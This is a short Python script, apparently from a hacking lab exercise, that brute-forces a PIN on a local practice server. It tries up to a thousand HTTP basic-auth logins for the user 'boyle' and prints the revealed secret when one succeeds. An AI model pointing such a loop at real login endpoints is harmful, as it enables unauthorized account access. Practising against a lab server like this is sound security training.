from requests import get, post

from task2.task2 import pin_number_solver

# Add the URL here you want to hack
# One time URL - change once
BASE_URL = "http://localhost:5000"

# Level URL
# Enter the level URL, change on each task.
# The url 
LEVEL_URL = "task1/boyles_secret"

# Level 1
def boyle_test():
    count = 0
    solver = (p for p in pin_number_solver())
    while count < 10**3:
        pin = next(solver)
        response = get(f"{BASE_URL}/{LEVEL_URL}", auth=("boyle", pin))
        if response.ok:
            print(f"Success!!!! Secrets: {response.text}")
            print(f"The pin number was {pin}")
            break
        print(f"Attempt: {count}")
        count +=1


boyle_test()
# Level2